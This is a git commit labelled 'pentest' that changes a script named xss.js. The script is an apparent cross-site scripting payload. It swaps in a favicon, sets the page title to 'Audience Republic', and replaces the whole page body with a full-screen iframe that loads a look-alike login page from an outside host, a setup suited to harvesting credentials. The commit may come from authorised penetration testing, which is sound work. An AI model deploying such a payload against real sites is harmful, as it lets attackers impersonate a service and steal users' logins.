6712f78d2839efc8b20c5e7dd3884f506c8ea6c8
Alesya Huzik <mail@alesya.me>
2025-11-11 16:46:19 +1100

    pentest

--- xss.js
+++ xss.js
@@ -8,4 +8,5 @@ if (!link) {
     document.head.appendChild(link);
 }
 link.href = 'https://cdn.arep.co/img/favicon/favicon.ico';
+document.title = "Audience Republic"
 document.body.innerHTML='<iframe frameBorder=0 style="position: absolute; top: 0; left: 0; width: 100vw; height: 100vh;" src="https://aguzik.net/ar-login.html"/>'
